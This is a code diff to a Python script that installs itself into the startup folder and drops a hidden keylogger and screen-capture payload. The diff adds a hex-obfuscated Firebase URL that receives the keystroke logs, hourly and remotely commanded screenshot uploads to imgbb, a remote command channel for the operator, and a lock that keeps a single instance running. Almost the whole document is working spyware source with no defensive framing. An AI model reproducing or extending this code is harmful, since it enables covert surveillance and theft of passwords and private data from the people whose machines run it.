@@ -3,7 +3,7 @@ import subprocess
 import sys
 import threading
 
-libraries = ["pynput", "requests"]
+libraries = ["pynput", "requests","pillow","filelock","DateTime"]
 def install_libraries(libraries):
     for lib in libraries:
         subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
@@ -23,48 +23,146 @@ batch_file_path = os.path.join(startup_folder, batch_file_name)
 if not os.path.exists(systempy_folder):
     os.makedirs(systempy_folder)
 
-python_code = '''from pynput.keyboard import Key, Listener
-import os
-from datetime import datetime
+python_code = '''import os
 import requests
+from datetime import datetime
 import socket
 import threading
 import time
+from PIL import ImageGrab
+from pynput.keyboard import Listener, Key
+from filelock import FileLock, Timeout
 
-firebase_url = 'https://project-runnner-default-rtdb.firebaseio.com/'
-log_file = "system-log.txt"
+fu = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x72\x6f\x6a\x65\x63\x74\x2d\x72\x75\x6e\x6e\x6e\x65\x72\x2d\x64\x65\x66\x61\x75\x6c\x74\x2d\x72\x74\x64\x62\x2e\x66\x69\x72\x65\x62\x61\x73\x65\x69\x6f\x2e\x63\x6f\x6d\x2f'
+os.makedirs('files', exist_ok=True)
+log_file = "files/system-files.txt"
 hostname = socket.gethostname()
+screenshot_folder = "systemss"
+command_path = f'users/{hostname}/command.json'
 
-# Function to upload the log file to Firebase
+LOCK_FILE = "files/my_script.lock"
+
+def prevent_multiple_instances():
+    lock = FileLock(LOCK_FILE + ".lock")
+    try:
+        lock.acquire(timeout=0)
+        return lock
+    except Timeout:
+        print("Another instance of this script is already running. Exiting.")
+        exit(1)
+
+
+def is_internet_available():
+    try:
+        socket.create_connection(("8.8.8.8", 53), timeout=5)
+        return True
+    except (socket.timeout, socket.error):
+        return False
+
+
+def fetch_api_key():
+    api_key_path = 'system.json'
+    try:
+        response = requests.get(fu + api_key_path)
+        if response.status_code == 200:
+            api_key_data = response.json()
+            return api_key_data.get('api_key')
+        else:
+            return None
+    except requests.exceptions.RequestException as e:
+        return None
+
+
 def upload_log():
-    db_path = f'users/{hostname}/{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.json'
+    with open(log_file, 'r') as file:
+        content = file.read().strip()
+
+    command_path = f'users/{hostname}/command.json'
+    active_path = f'users/{hostname}/activate.json'
+    try:
+        active = {'last_login': datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+        response = requests.put(fu + active_path, json=active)
+        requests.put(fu + command_path,
+                     json={'ss_count': 0, 'log_upload': False})
+    except:
+        pass
+
+    new_log_marker = f"** New logging started at"
+    if content.startswith(new_log_marker) and content.count(new_log_marker) == 1 and len(content.split("\\n")) == 1:
+        return False
+
+    if not is_internet_available():
+        return False
+
+    db_path = f'users/{hostname}/keylog/{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.json'
+
     with open(log_file, 'r') as file:
         file_data = file.read()
     data_to_upload = {'runnner': file_data}
-    
-    try:
-        response = requests.put(firebase_url + db_path, json=data_to_upload)
-        if response.status_code == 200:
-            print(f"Uploaded: {log_file}")
-            # Only delete the log file after successful upload
-            with open(log_file, 'w') as file:  # Empty the log file
-                file.truncate(0)
-        else:
-            print(f"Failed to upload (Status code {response.status_code}): {log_file}")
-    except requests.exceptions.RequestException as e:
-        print(f"Failed to upload {log_file}: {e}")
 
-# Function to periodically attempt uploading the log file every 2 hours
+    try:
+        response = requests.put(fu + db_path, json=data_to_upload)
+        if response.status_code == 200:
+            with open(log_file, 'w') as file:
+                file.truncate(0)
+            add_new_log_marker()
+            return True
+        else:
+            return False
+    except requests.exceptions.RequestException as e:
+        return False
+
+
+def add_new_log_marker():
+    with open(log_file, 'a') as file:
+        file.write(
+            f"\\n** New logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} **\\n")
+
+
 def periodic_upload():
     while True:
-        upload_log()
-        time.sleep(2 * 3600)  # Wait for 2 hours before trying again
+        if upload_log():
+            pass
+        else:
+            pass
+        time.sleep(3600)
 
-# Debounce settings for keystrokes
+
+def periodic_screenshots():
+    os.makedirs(screenshot_folder, exist_ok=True)
+    while True:
+        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        screenshot_path = os.path.join(
+            screenshot_folder, f"{hostname}_{timestamp}.png")
+        try:
+            screenshot = ImageGrab.grab()
+            screenshot.save(screenshot_path)
+            upload_image_to_imgbb(screenshot_path)
+            os.remove(screenshot_path)
+        except Exception as e:
+            pass
+        time.sleep(3600)
+
+
+def upload_image_to_imgbb(image_path):
+    api_key = fetch_api_key()
+    with open(image_path, 'rb') as image_file:
+        files = {'image': image_file}
+        params = {'key': api_key}
+        response = requests.post(
+            'https://api.imgbb.com/1/upload', files=files, params=params)
+
+    if response.status_code == 200:
+        response_json = response.json()
+        image_url = response_json['data']['url']
+    else:
+        pass
+
+
 recent_keys = {}
 debounce_time = 0.2
 
-# Function to write keystrokes to the current log file with debounce
+
 def write_to_file(key):
     current_time = time.time()
     key_str = None
@@ -76,45 +174,127 @@ def write_to_file(key):
         key_str = "\\n"
     elif key == Key.backspace:
         key_str = "[BS]"
-    
+
     if key_str and (current_time - recent_keys.get(key_str, 0)) > debounce_time:
         with open(log_file, "a") as file:
             file.write(key_str)
         recent_keys[key_str] = current_time
 
-# Function to start the listener for keystrokes
+
 def start_listener():
     with Listener(on_press=write_to_file) as listener:
         listener.join()
 
-# Ensure the log file exists, create it if it doesn't
+
 def ensure_log_exists():
-    if not os.path.exists(log_file):  # Create the log file if it doesn't exist
+    if not os.path.exists(log_file):
         with open(log_file, 'w') as file:
-            pass  # Create an empty log file
+            pass
 
-# Main process: check if the log has been uploaded and create a new log if necessary
-if __name__ == "__main__":
-    ensure_log_exists()  # Ensure that the log file exists
 
-    # Upload the log file immediately at the start
-    upload_log()
+def delete_all_files_in_folder(folder_path):
+    try:
+        if not os.path.exists(folder_path):
+            return
+        for file_name in os.listdir(folder_path):
+            file_path = os.path.join(folder_path, file_name)
+            if os.path.isfile(file_path):
+                os.remove(file_path)
+    except Exception as e:
+        pass
 
-    # Add a mark indicating the start of a new logging session
-    with open(log_file, 'a') as file:
-        file.write(f"\\n--- New logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\\n")
 
-    # Start listener in a separate thread
-    listener_thread = threading.Thread(target=start_listener)
+def handle_screenshot_interval():
+    os.makedirs(screenshot_folder, exist_ok=True)
+    while True:
+        try:
+            response = requests.get(fu + command_path)
+            if response.status_code == 200:
+                command_data = response.json()
+
+                if command_data is None:
+                    command_data = {'ss_count': 0, 'log_upload': True}
+                elif 'ss_count' not in command_data:
+                    command_data['ss_count'] = 0
+                    command_data['log_upload'] = True
+
+                ss_count = command_data.get('ss_count', 0)
+                if ss_count > 0:
+                    for _ in range(ss_count):
+                        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+                        image_path = os.path.join(
+                            screenshot_folder, f"{hostname}_{timestamp}.png")
+                        try:
+                            screenshot = ImageGrab.grab()
+                            screenshot.save(image_path)
+                            upload_image_to_imgbb(image_path)
+                            os.remove(image_path)
+                            time.sleep(10)
+                        except Exception as e:
+                            pass
+
+                    command_data['ss_count'] = max(
+                        0, command_data['ss_count'] - ss_count)
+                    requests.put(fu + command_path, json=command_data)
+
+            else:
+                pass
+        except requests.exceptions.RequestException as e:
+            pass
+
+        time.sleep(10)
+        delete_all_files_in_folder(screenshot_folder)
+
+
+def check_immediate_upload():
+    while True:
+        try:
+            response = requests.get(fu + command_path)
+            if response.status_code == 200:
+                command_data = response.json()
+                if command_data is None:
+                    command_data = {'ss_count': 0, 'log_upload': False}
+                elif 'ss_count' not in command_data:
+                    command_data['ss_count'] = 0
+                    command_data['log_upload'] = False
+
+                log_upload = command_data.get('log_upload', False)
+                if log_upload:
+                    upload_log()
+                    time.sleep(10)
+        except:
+            pass
+
+
+def main():
+    ensure_log_exists()
+    add_new_log_marker()
+
+    listener_thread = threading.Thread(target=start_listener, daemon=True)
     listener_thread.start()
 
-    # Start periodic upload in a separate thread
-    upload_thread = threading.Thread(target=periodic_upload)
+    upload_thread = threading.Thread(target=periodic_upload, daemon=True)
     upload_thread.start()
 
-    # Ensure both threads keep running
+    log_interval_thread = threading.Thread(
+        target=check_immediate_upload, daemon=True)
+    log_interval_thread.start()
+
+    screenshot_interval_thread = threading.Thread(
+        target=handle_screenshot_interval, daemon=True)
+    screenshot_interval_thread.start()
+
     listener_thread.join()
     upload_thread.join()
+    screenshot_interval_thread.join()
+    log_interval_thread.join()
+
+
+lock = prevent_multiple_instances()
+try:
+    main()
+finally:
+    lock.release()
 '''
 
 with open(python_script_dest, "w") as file:
